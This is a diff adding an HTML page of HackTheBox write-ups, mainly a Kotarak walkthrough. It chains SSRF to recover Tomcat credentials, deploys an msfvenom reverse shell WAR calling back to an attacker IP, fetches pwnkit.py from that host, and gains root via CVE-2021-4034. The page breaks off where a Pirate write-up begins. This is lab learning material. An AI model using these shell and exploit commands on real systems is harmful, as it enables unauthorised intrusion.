@@ -1,0 +1,1578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>m1st | Notes</title>
+<style>
+*, *::before, *::after {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+:root {
+  --bg-primary:    #07060b;
+  --bg-secondary:  #0e0c15;
+  --bg-card:       #13111c;
+  --bg-card-hover: #1a1727;
+  --bg-sidebar:    #0b0a11;
+  --bg-active:     #1e1b2e;
+  --text-primary:  #e8e6f0;
+  --text-secondary:#9895a8;
+  --text-muted:    #5d5a6e;
+  --accent:        #a855f7;
+  --accent-dim:    #7c3aed;
+  --accent-glow:   rgba(168, 85, 247, 0.25);
+  --border:        #1e1b2e;
+  --border-light:  #2a2740;
+  --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+  --font-mono: 'JetBrains Mono', 'Fira Code', 'SF Mono', Consolas, monospace;
+  --sidebar-width: 300px;
+  --topbar-height: 48px;
+}
+
+html {
+  scrollbar-width: thin;
+  scrollbar-color: var(--accent-dim) var(--bg-secondary);
+}
+
+body {
+  font-family: var(--font-sans);
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.7;
+  overflow: hidden;
+  height: 100vh;
+  -webkit-font-smoothing: antialiased;
+}
+
+::selection {
+  background: var(--accent-dim);
+  color: #fff;
+}
+
+a { color: inherit; text-decoration: none; }
+
+/* ── TOP BAR ─────────────────────────────────── */
+#topbar {
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  height: var(--topbar-height);
+  background: rgba(11, 10, 17, 0.95);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  padding: 0 1rem;
+  gap: 0.5rem;
+  z-index: 200;
+  backdrop-filter: blur(16px);
+  user-select: none;
+}
+
+.topbar-logo {
+  font-family: var(--font-mono);
+  font-size: 1rem;
+  font-weight: 700;
+  color: var(--accent);
+  margin-right: 0.5rem;
+  white-space: nowrap;
+}
+.topbar-logo span { color: var(--text-muted); }
+
+/* open-tab pill */
+.tab-strip {
+  display: flex;
+  gap: 2px;
+  flex: 1;
+  overflow: hidden;
+}
+.tab-pill {
+  display: flex;
+  align-items: center;
+  gap: 0.4rem;
+  padding: 0 1rem;
+  height: 30px;
+  font-size: 0.85rem;
+  font-family: var(--font-mono);
+  color: var(--text-muted);
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  cursor: pointer;
+  transition: all 0.15s;
+  white-space: nowrap;
+}
+.tab-pill:hover { color: var(--text-secondary); border-color: var(--border-light); }
+.tab-pill.active {
+  color: var(--text-primary);
+  background: var(--bg-active);
+  border-color: var(--accent-dim);
+}
+.tab-pill .tab-close {
+  font-size: 0.7rem;
+  color: var(--text-muted);
+  line-height: 1;
+  padding: 1px 2px;
+  border-radius: 2px;
+  transition: color 0.15s, background 0.15s;
+}
+.tab-pill .tab-close:hover { color: #fff; background: rgba(255,255,255,0.08); }
+.tab-pill .tab-dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+
+.topbar-back {
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+  color: var(--text-muted);
+  padding: 0 0.9rem;
+  height: 30px;
+  display: flex;
+  align-items: center;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  cursor: pointer;
+  transition: all 0.15s;
+  white-space: nowrap;
+  text-decoration: none;
+}
+.topbar-back:hover { color: var(--text-primary); border-color: var(--border-light); }
+
+/* ── LAYOUT ──────────────────────────────────── */
+#layout {
+  display: flex;
+  height: 100vh;
+  padding-top: var(--topbar-height);
+}
+
+/* ── SIDEBAR ─────────────────────────────────── */
+#sidebar {
+  width: var(--sidebar-width);
+  flex-shrink: 0;
+  background: var(--bg-sidebar);
+  border-right: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  transition: width 0.25s ease;
+}
+#sidebar.collapsed { width: 0; }
+
+.sidebar-header {
+  padding: 0.85rem 1rem 0.6rem;
+  font-family: var(--font-mono);
+  font-size: 0.78rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  user-select: none;
+}
+.sidebar-header span { opacity: 0.6; }
+
+.sidebar-search {
+  padding: 0.5rem 0.75rem;
+  border-bottom: 1px solid var(--border);
+}
+.sidebar-search input {
+  width: 100%;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.45rem 0.75rem;
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+  color: var(--text-secondary);
+  outline: none;
+  transition: border-color 0.2s;
+}
+.sidebar-search input:focus { border-color: var(--accent-dim); }
+.sidebar-search input::placeholder { color: var(--text-muted); }
+
+.sidebar-tree {
+  flex: 1;
+  overflow-y: auto;
+  padding: 0.5rem 0;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+}
+
+/* Folder */
+.folder {
+  user-select: none;
+}
+.folder-header {
+  display: flex;
+  align-items: center;
+  gap: 0.4rem;
+  padding: 0.4rem 0.75rem;
+  cursor: pointer;
+  font-size: 0.92rem;
+  font-family: var(--font-mono);
+  color: var(--text-secondary);
+  transition: background 0.1s;
+  border-radius: 4px;
+  margin: 0 0.3rem;
+}
+.folder-header:hover { background: rgba(255,255,255,0.03); }
+.folder-arrow {
+  font-size: 0.55rem;
+  color: var(--text-muted);
+  transition: transform 0.2s;
+  flex-shrink: 0;
+}
+.folder.open .folder-arrow { transform: rotate(90deg); }
+.folder-icon {
+  font-size: 0.8rem;
+  flex-shrink: 0;
+}
+.folder-count {
+  margin-left: auto;
+  font-size: 0.72rem;
+  color: var(--text-muted);
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 0 6px;
+  line-height: 1.7;
+}
+
+.folder-children {
+  display: none;
+  padding-left: 0.5rem;
+}
+.folder.open .folder-children { display: block; }
+
+/* File entry */
+.file-entry {
+  display: flex;
+  align-items: center;
+  gap: 0.4rem;
+  padding: 0.38rem 0.75rem 0.38rem 1.6rem;
+  font-size: 0.88rem;
+  font-family: var(--font-mono);
+  color: var(--text-muted);
+  cursor: pointer;
+  transition: background 0.1s, color 0.1s;
+  border-radius: 4px;
+  margin: 0 0.3rem;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.file-entry:hover { background: rgba(255,255,255,0.04); color: var(--text-secondary); }
+.file-entry.active {
+  background: var(--bg-active);
+  color: var(--text-primary);
+  border-left: 2px solid var(--accent);
+  padding-left: calc(1.5rem - 2px);
+}
+.file-entry.active .file-icon { color: var(--accent); }
+.file-icon { font-size: 0.7rem; flex-shrink: 0; }
+.file-difficulty {
+  margin-left: auto;
+  font-size: 0.68rem;
+  padding: 2px 6px;
+  border-radius: 3px;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  flex-shrink: 0;
+}
+.diff-easy   { color: #4ade80; background: rgba(74, 222, 128, 0.1); }
+.diff-medium { color: #fb923c; background: rgba(251, 146, 60, 0.1); }
+.diff-hard   { color: #f87171; background: rgba(248, 113, 113, 0.1); }
+.diff-insane { color: var(--accent); background: rgba(168, 85, 247, 0.1); }
+
+/* Sidebar resize handle */
+.sidebar-resize {
+  position: absolute;
+  right: -3px;
+  top: var(--topbar-height);
+  bottom: 0;
+  width: 6px;
+  cursor: col-resize;
+  z-index: 50;
+}
+.sidebar-resize:hover::after,
+.sidebar-resize.dragging::after {
+  content: '';
+  position: absolute;
+  left: 2px;
+  top: 0; bottom: 0;
+  width: 2px;
+  background: var(--accent-dim);
+}
+
+/* ── MAIN CONTENT ────────────────────────────── */
+#main {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  position: relative;
+}
+
+/* breadcrumb path bar */
+#pathbar {
+  height: 34px;
+  background: var(--bg-secondary);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  padding: 0 1.5rem;
+  gap: 0.3rem;
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  color: var(--text-muted);
+  flex-shrink: 0;
+  user-select: none;
+}
+.path-sep { opacity: 0.4; margin: 0 0.1rem; }
+.path-crumb { cursor: pointer; transition: color 0.15s; }
+.path-crumb:hover { color: var(--text-secondary); }
+.path-crumb.current { color: var(--text-secondary); }
+
+/* content scroll area */
+#content-scroll {
+  flex: 1;
+  overflow-y: auto;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+}
+
+/* the actual article pane */
+.content-pane {
+  display: none;
+  max-width: 900px;
+  margin: 0 auto;
+  padding: 3.5rem 3rem 5rem;
+}
+.content-pane.active { display: block; }
+
+/* landing / empty state */
+#landing {
+  max-width: 900px;
+  margin: 0 auto;
+  padding: 3.5rem 3rem 5rem;
+}
+
+/* article styles */
+.post-meta {
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+  flex-wrap: wrap;
+  margin-bottom: 2rem;
+  padding-bottom: 1.5rem;
+  border-bottom: 1px solid var(--border);
+}
+.post-badge {
+  font-family: var(--font-mono);
+  font-size: 0.78rem;
+  padding: 0.25rem 0.7rem;
+  border-radius: 4px;
+  letter-spacing: 0.05em;
+  text-transform: uppercase;
+}
+.badge-htb     { color: #4ade80; background: rgba(74, 222, 128, 0.1); border: 1px solid rgba(74,222,128,0.2); }
+.badge-school  { color: #60a5fa; background: rgba(96, 165, 250, 0.1); border: 1px solid rgba(96,165,250,0.2); }
+.badge-misc    { color: var(--accent); background: rgba(168,85,247,0.1); border: 1px solid rgba(168,85,247,0.2); }
+.badge-project { color: #f59e0b; background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.2); }
+.post-date {
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  color: var(--text-muted);
+  margin-left: auto;
+}
+
+.post-title {
+  font-size: clamp(1.9rem, 3.5vw, 2.8rem);
+  font-weight: 700;
+  line-height: 1.15;
+  letter-spacing: -0.02em;
+  margin-bottom: 1.5rem;
+}
+
+.post-tags {
+  display: flex;
+  gap: 0.4rem;
+  flex-wrap: wrap;
+  margin-bottom: 2rem;
+}
+.post-tag {
+  font-family: var(--font-mono);
+  font-size: 0.8rem;
+  color: var(--text-muted);
+  background: rgba(255,255,255,0.04);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 0.25rem 0.6rem;
+}
+.post-tag::before { content: '#'; opacity: 0.5; }
+
+.post-body h2 {
+  font-size: 1.5rem;
+  font-weight: 600;
+  margin: 2.25rem 0 0.85rem;
+  color: var(--text-primary);
+  letter-spacing: -0.01em;
+}
+.post-body h3 {
+  font-size: 1.15rem;
+  font-weight: 600;
+  margin: 1.75rem 0 0.6rem;
+  color: var(--text-secondary);
+}
+.post-body p {
+  color: var(--text-secondary);
+  font-size: 1.05rem;
+  margin-bottom: 1.1rem;
+  line-height: 1.8;
+}
+.post-body code {
+  font-family: var(--font-mono);
+  font-size: 0.88em;
+  background: rgba(168,85,247,0.08);
+  border: 1px solid rgba(168,85,247,0.15);
+  border-radius: 3px;
+  padding: 0.15em 0.45em;
+  color: #c4b5fd;
+}
+.post-body pre {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--accent-dim);
+  border-radius: 6px;
+  padding: 1.4rem 1.75rem;
+  overflow-x: auto;
+  margin: 1.5rem 0;
+  font-family: var(--font-mono);
+  font-size: 0.92rem;
+  line-height: 1.75;
+  color: var(--text-secondary);
+  scrollbar-width: thin;
+}
+.post-body pre code {
+  background: none;
+  border: none;
+  padding: 0;
+  font-size: inherit;
+  color: inherit;
+}
+.post-body pre .comment { color: var(--text-muted); }
+.post-body pre .keyword { color: #c084fc; }
+.post-body pre .string  { color: #4ade80; }
+.post-body pre .number  { color: #fb923c; }
+
+.post-body blockquote {
+  border-left: 3px solid var(--accent-dim);
+  padding-left: 1.25rem;
+  margin: 1.25rem 0;
+  color: var(--text-muted);
+  font-style: italic;
+}
+.post-body ul, .post-body ol {
+  padding-left: 1.5rem;
+  margin-bottom: 1.1rem;
+  color: var(--text-secondary);
+  font-size: 1.05rem;
+  line-height: 1.8;
+}
+.post-body li { margin-bottom: 0.3rem; }
+.post-body a { color: var(--accent); text-decoration: underline; text-underline-offset: 3px; }
+.post-body strong { color: var(--text-primary); font-weight: 600; }
+
+/* Tables */
+.post-body table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1.5rem 0;
+  font-size: 0.95rem;
+}
+.post-body thead th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+  color: var(--text-primary);
+  font-weight: 600;
+}
+.post-body tbody td {
+  padding: 0.5rem 1rem;
+  border: 1px solid var(--border);
+  color: var(--text-secondary);
+}
+.post-body tbody tr:hover {
+  background: rgba(255,255,255,0.02);
+}
+
+.post-body .callout {
+  background: rgba(168,85,247,0.06);
+  border: 1px solid rgba(168,85,247,0.2);
+  border-left: 3px solid var(--accent);
+  border-radius: 6px;
+  padding: 1.1rem 1.4rem;
+  margin: 1.5rem 0;
+  font-size: 1rem;
+}
+.callout-label {
+  font-family: var(--font-mono);
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: var(--accent);
+  margin-bottom: 0.5rem;
+  font-weight: 600;
+}
+
+.post-body .flag-box {
+  background: rgba(74,222,128,0.06);
+  border: 1px solid rgba(74,222,128,0.2);
+  border-left: 3px solid #4ade80;
+  border-radius: 6px;
+  padding: 1.1rem 1.4rem;
+  margin: 1.5rem 0;
+  font-family: var(--font-mono);
+  font-size: 0.95rem;
+  color: #4ade80;
+}
+
+.section-divider {
+  border: none;
+  border-top: 1px solid var(--border);
+  margin: 2.5rem 0;
+}
+
+/* landing / welcome card */
+.welcome-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 2.75rem 3rem;
+  margin-bottom: 2rem;
+}
+.welcome-card .wc-label {
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  color: var(--accent);
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  margin-bottom: 0.75rem;
+}
+.welcome-card h2 {
+  font-size: 2rem;
+  font-weight: 700;
+  margin-bottom: 0.85rem;
+  letter-spacing: -0.01em;
+}
+.welcome-card p {
+  color: var(--text-secondary);
+  font-size: 1.05rem;
+  max-width: 560px;
+  line-height: 1.75;
+}
+.recent-list {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+}
+.recent-item {
+  display: flex;
+  align-items: center;
+  gap: 0.85rem;
+  padding: 0.9rem 1.25rem;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  cursor: pointer;
+  transition: border-color 0.2s, background 0.2s, transform 0.15s;
+  font-size: 1rem;
+}
+.recent-item:hover {
+  border-color: var(--accent-dim);
+  background: var(--bg-card-hover);
+  transform: translateX(3px);
+}
+.recent-item-title { font-weight: 500; flex: 1; }
+.recent-item-meta {
+  font-family: var(--font-mono);
+  font-size: 0.82rem;
+  color: var(--text-muted);
+  white-space: nowrap;
+}
+
+.stats-row {
+  display: flex;
+  gap: 1rem;
+  margin-bottom: 2rem;
+}
+.stat-mini {
+  flex: 1;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1.25rem 1.5rem;
+  text-align: center;
+}
+.stat-mini .num {
+  font-family: var(--font-mono);
+  font-size: 2rem;
+  font-weight: 700;
+  color: var(--accent);
+  line-height: 1;
+}
+.stat-mini .lbl {
+  font-size: 0.82rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin-top: 0.4rem;
+}
+
+/* Sidebar toggle btn */
+#sidebar-toggle {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  cursor: pointer;
+  font-size: 1rem;
+  padding: 5px 7px;
+  border-radius: 4px;
+  line-height: 1;
+  transition: color 0.15s, background 0.15s;
+  margin-right: 0.25rem;
+}
+#sidebar-toggle:hover { color: var(--text-secondary); background: rgba(255,255,255,0.05); }
+
+/* ── PARTICLES (subtle) ─────────────────────── */
+#particles {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+  opacity: 0.4;
+}
+</style>
+</head>
+<body>
+
+<canvas id="particles"></canvas>
+
+<!-- TOP BAR -->
+<div id="topbar">
+  <button id="sidebar-toggle" title="Toggle sidebar">&#9776;</button>
+  <div class="topbar-logo">m1st<span>_</span></div>
+  <div class="tab-strip" id="tabStrip">
+    <!-- tabs injected by JS -->
+  </div>
+  <a href="index.html" class="topbar-back">&larr; portfolio</a>
+</div>
+
+<!-- LAYOUT -->
+<div id="layout" style="position:relative;">
+
+  <!-- SIDEBAR -->
+  <div id="sidebar">
+    <div class="sidebar-header">
+      <span>writeups</span>
+      <span>m1st</span>
+    </div>
+    <div class="sidebar-search">
+      <input type="text" id="searchInput" placeholder="Search notes..." autocomplete="off">
+    </div>
+    <div class="sidebar-tree" id="sidebarTree">
+
+      <!-- HTB FOLDER -->
+      <div class="folder open" data-folder="htb">
+        <div class="folder-header" onclick="toggleFolder(this)">
+          <span class="folder-arrow">&#9654;</span>
+          <span class="folder-icon">&#128193;</span>
+          <span>HTB</span>
+          <span class="folder-count">8</span>
+        </div>
+        <div class="folder-children">
+          <div class="file-entry active" data-post="htb-kotarak" onclick="openPost('htb-kotarak', this)">
+            <span class="file-icon">&#128196;</span>
+            Kotarak
+            <span class="file-difficulty diff-hard">Hard</span>
+          </div>
+          <div class="file-entry" data-post="htb-pirate" onclick="openPost('htb-pirate', this)">
+            <span class="file-icon">&#128196;</span>
+            Pirate
+            <span class="file-difficulty diff-hard">Hard</span>
+          </div>
+          <div class="file-entry" data-post="htb-interpreter" onclick="openPost('htb-interpreter', this)">
+            <span class="file-icon">&#128196;</span>
+            Interpreter
+            <span class="file-difficulty diff-medium">Med</span>
+          </div>
+          <div class="file-entry" data-post="htb-monitorsfour" onclick="openPost('htb-monitorsfour', this)">
+            <span class="file-icon">&#128196;</span>
+            MonitorsFour
+            <span class="file-difficulty diff-medium">Med</span>
+          </div>
+          <div class="file-entry" data-post="htb-pterodactyl" onclick="openPost('htb-pterodactyl', this)">
+            <span class="file-icon">&#128196;</span>
+            Pterodactyl
+            <span class="file-difficulty diff-medium">Med</span>
+          </div>
+          <div class="file-entry" data-post="htb-variatype" onclick="openPost('htb-variatype', this)">
+            <span class="file-icon">&#128196;</span>
+            VariaType
+            <span class="file-difficulty diff-medium">Med</span>
+          </div>
+          <div class="file-entry" data-post="htb-cctv" onclick="openPost('htb-cctv', this)">
+            <span class="file-icon">&#128196;</span>
+            CCTV
+            <span class="file-difficulty diff-easy">Easy</span>
+          </div>
+          <div class="file-entry" data-post="htb-facts" onclick="openPost('htb-facts', this)">
+            <span class="file-icon">&#128196;</span>
+            Facts
+            <span class="file-difficulty diff-easy">Easy</span>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /sidebar-tree -->
+  </div><!-- /sidebar -->
+
+  <!-- MAIN CONTENT -->
+  <div id="main">
+    <div id="pathbar">
+      <span class="path-crumb" onclick="showLanding()">writeups</span>
+      <span class="path-sep">/</span>
+      <span class="path-crumb" id="pathFolder">HTB</span>
+      <span class="path-sep">/</span>
+      <span class="path-crumb current" id="pathFile">Kotarak</span>
+    </div>
+
+    <div id="content-scroll">
+
+      <!-- LANDING -->
+      <div id="landing" style="display:none;">
+        <div class="stats-row">
+          <div class="stat-mini"><div class="num">8</div><div class="lbl">Writeups</div></div>
+          <div class="stat-mini"><div class="num">2</div><div class="lbl">Hard</div></div>
+          <div class="stat-mini"><div class="num">4</div><div class="lbl">Medium</div></div>
+          <div class="stat-mini"><div class="num">2</div><div class="lbl">Easy</div></div>
+        </div>
+        <div class="welcome-card">
+          <div class="wc-label">// m1st &mdash; writeups</div>
+          <h2>Welcome back.</h2>
+          <p>Select a writeup from the sidebar to start reading. Detailed walkthroughs of HackTheBox machines &mdash; from recon to root.</p>
+        </div>
+        <div style="font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.75rem;">Recently viewed</div>
+        <div class="recent-list">
+          <div class="recent-item" onclick="openPost('htb-facts', null)">
+            <span class="post-badge badge-htb">HTB</span>
+            <span class="recent-item-title">Facts &mdash; Easy</span>
+            <span class="recent-item-meta">2026.03.18</span>
+          </div>
+          <div class="recent-item" onclick="openPost('htb-pterodactyl', null)">
+            <span class="post-badge badge-htb">HTB</span>
+            <span class="recent-item-title">Pterodactyl &mdash; Medium</span>
+            <span class="recent-item-meta">2026.03.20</span>
+          </div>
+          <div class="recent-item" onclick="openPost('htb-kotarak', null)">
+            <span class="post-badge badge-htb">HTB</span>
+            <span class="recent-item-title">Kotarak &mdash; Hard</span>
+            <span class="recent-item-meta">2026.03.15</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- ─── POSTS ──────────────────────────── -->
+
+      <!-- HTB: Kotarak -->
+      <div class="content-pane active" id="post-htb-kotarak">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-hard" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Hard</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.15</span>
+        </div>
+        <h1 class="post-title">Kotarak &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">hard</span>
+          <span class="post-tag">ssrf</span>
+          <span class="post-tag">tomcat</span>
+          <span class="post-tag">pwnkit</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>Kotarak involves chaining a Server-Side Request Forgery (SSRF) vulnerability to discover a hidden internal service, recovering Tomcat manager credentials, and deploying a WAR-based reverse shell for initial access as <code>tomcat</code>. Privilege escalation exploits CVE-2021-4034 (PwnKit) via the unpatched kernel and SUID <code>pkexec</code>.</p>
+
+          <h2>Reconnaissance</h2>
+          <h3>Nmap</h3>
+          <pre><span class="keyword">$</span> nmap -sV -sC -Pn -p- 10.129.1.117</pre>
+          <table>
+            <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+            <tbody>
+              <tr><td>22</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu</td></tr>
+              <tr><td>8009</td><td>AJP13</td><td>Apache Jserv Protocol v1.3</td></tr>
+              <tr><td>8080</td><td>HTTP</td><td>Apache Tomcat 8.5.5</td></tr>
+              <tr><td>60000</td><td>HTTP</td><td>Apache httpd 2.4.18 (Ubuntu)</td></tr>
+            </tbody>
+          </table>
+          <p>Four open ports. The non-standard port 60000 running a custom Apache app is the immediate priority. Port 8009 (AJP) and 8080 (Tomcat) are interesting secondary targets.</p>
+
+          <h2>Initial Enumeration &mdash; Port 60000</h2>
+          <p>Browsing to <code>http://10.129.1.117:60000</code> reveals a page titled <strong>"Kotarak Web Hosting Private Browser"</strong> &mdash; a form that takes a URL as input and fetches it server-side.</p>
+          <p>Directory enumeration found <code>/info.php</code> &mdash; a full <code>phpinfo()</code> page with useful details: no <code>open_basedir</code> restriction, <code>mod_status</code> loaded, and cURL extension loaded (supports file://, gopher://, dict://).</p>
+
+          <h2>SSRF Exploitation</h2>
+          <p>The form submits to <code>url.php?path=</code>, which fetches the supplied URL via cURL and reflects the response. This is a confirmed SSRF.</p>
+          <h3>Internal Port Scan</h3>
+          <pre><span class="keyword">$</span> ffuf -u <span class="string">"http://10.129.1.117:60000/url.php?path=http://127.0.0.1:FUZZ"</span> \
+  -w /usr/share/seclists/Discovery/Infrastructure/common-http-ports.txt \
+  -fw 47</pre>
+          <div class="callout">
+            <div class="callout-label">&#128161; Note</div>
+            The SSRF wrapper always returns HTTP 200. Filtering by word count (<code>-fw 47</code>) rather than status code is required to cut through false positives, since Tomcat 404 error pages consistently return 47 words.
+          </div>
+          <p>Results: <strong>Port 8080</strong> &mdash; Apache Tomcat (994 bytes) and <strong>Port 3306</strong> &mdash; MySQL banner (123 bytes).</p>
+
+          <h3>Apache server-status &mdash; Discovering Port 888</h3>
+          <p>phpinfo() confirmed <code>mod_status</code> was loaded. Apache's server-status page is restricted to localhost, but accessible via the SSRF:</p>
+          <pre>http://10.129.1.117:60000/url.php?path=http://127.0.0.1:60000/server-status</pre>
+          <p>The status table revealed multiple Apache workers serving requests to <strong>127.0.0.1:888</strong> &mdash; a service that never appeared in the nmap scan because it only listens on localhost.</p>
+
+          <h3>Port 888 &mdash; Simple File Viewer</h3>
+          <p>Accessing port 888 via SSRF returns a <strong>Simple File Viewer</strong> interface listing files including one named <code>backup</code> (2.22 kB). Fetching it revealed <code>tomcat-users.xml</code> with plaintext credentials:</p>
+          <pre><span class="string">&lt;user username="admin" password="3@g01PdhB!"
+  roles="manager,manager-gui,admin-gui,manager-script"/&gt;</span></pre>
+
+          <h2>Initial Foothold &mdash; WAR Shell via Tomcat Manager</h2>
+          <p>With valid credentials, a reverse shell WAR payload was generated and deployed:</p>
+          <pre><span class="keyword">$</span> msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;attacker_ip&gt; LPORT=4444 \
+  -f war -o shell.war
+
+<span class="keyword">$</span> curl -s -u <span class="string">'admin:3@g01PdhB!'</span> -T shell.war \
+  <span class="string">'http://10.129.1.117:8080/manager/text/deploy?path=/shell'</span></pre>
+          <div class="callout">
+            <div class="callout-label">&#128161; Note</div>
+            The password contains <code>!</code> &mdash; use single quotes in curl to prevent bash history expansion.
+          </div>
+          <pre><span class="keyword">$</span> nc -lvnp 4444
+<span class="keyword">$</span> curl http://10.129.1.117:8080/shell/
+<span class="string">[*] Command shell session 1 opened</span></pre>
+          <p><strong>Shell received as <code>tomcat</code>.</strong></p>
+
+          <h2>Privilege Escalation &mdash; CVE-2021-4034 (PwnKit)</h2>
+          <p>The kernel version <code>4.4.0-83-generic</code> (Ubuntu 16.04) is unpatched and vulnerable. <code>/usr/bin/pkexec</code> is present as a SUID binary.</p>
+          <h3>Failed Attempt: CVE-2017-16995 (eBPF)</h3>
+          <p>The eBPF verifier exploit was tried first but failed with: <code>bpf_update_elem failed 'Argument list too long'</code>.</p>
+          <div class="callout">
+            <div class="callout-label">&#128161; Note</div>
+            Compiling on modern Kali without <code>-static</code> produces binaries requiring GLIBC_2.34, which the old target doesn't have. Always compile statically when targeting legacy systems. Also, <code>/tmp</code> is mounted with <code>noexec</code> on this box &mdash; use <code>/dev/shm</code> or <code>/var/tmp</code> instead.
+          </div>
+          <h3>Successful: PwnKit</h3>
+          <p>PwnKit exploits a memory corruption bug in <code>pkexec</code> (PolicyKit). The Python version requires no compilation:</p>
+          <pre><span class="keyword">$</span> cd /dev/shm
+<span class="keyword">$</span> wget http://&lt;attacker_ip&gt;/pwnkit.py
+<span class="keyword">$</span> python pwnkit.py
+<span class="string">Root shell obtained.</span></pre>
+          <div class="flag-box">&#127987; root.txt + user.txt captured.</div>
+
+          <h2>Full Attack Chain</h2>
+          <pre>1. Recon &mdash; Nmap finds 4 ports: SSH (22), AJP (8009), Tomcat (8080), Apache (60000)
+2. SSRF &mdash; Port 60000 has url.php?path= fetching arbitrary URLs server-side
+3. Internal enumeration &mdash; ffuf through SSRF discovers MySQL (3306), confirms Tomcat (8080)
+4. Hidden service &mdash; SSRF to server-status reveals localhost-only port 888
+5. Credential recovery &mdash; Port 888 file viewer exposes tomcat-users.xml
+6. Foothold &mdash; WAR reverse shell deployed via Tomcat manager
+7. Privesc &mdash; Unpatched kernel + SUID pkexec &rarr; PwnKit (CVE-2021-4034) &rarr; root</pre>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>SSRF is powerful</strong> &mdash; chaining SSRF through multiple internal services extracted credentials that weren't externally accessible</li>
+            <li><strong>Filter by content, not status</strong> &mdash; SSRF wrappers return 200 for everything; word count filtering was essential</li>
+            <li><strong>Old kernels = easy wins</strong> &mdash; always check <code>uname -r</code> early; pre-2022 systems with pkexec are almost certainly PwnKit-vulnerable</li>
+            <li><strong>Static compilation</strong> &mdash; when targeting old systems from modern Kali, use <code>gcc -static</code> to avoid GLIBC version mismatches</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- HTB: Pirate -->
+      <div class="content-pane" id="post-htb-pirate">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-hard" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Hard</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Windows AD</span>
+          <span class="post-date">2026.03.12</span>
+        </div>
+        <h1 class="post-title">Pirate &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">windows</span>
+          <span class="post-tag">hard</span>
+          <span class="post-tag">active-directory</span>
+          <span class="post-tag">ntlm-relay</span>
+          <span class="post-tag">spn-jacking</span>
+          <span class="post-tag">gmsa</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>Pirate is a Windows Active Directory box featuring a two-machine environment: DC01 (domain controller) and WEB01 (ADFS server on an internal network). The attack chain involves discovering Pre-Windows 2000 machine account passwords, extracting gMSA credentials, NTLM relay with Resource-Based Constrained Delegation to compromise WEB01, and SPN Jacking to abuse constrained delegation and gain Domain Admin on DC01.</p>
+
+          <table>
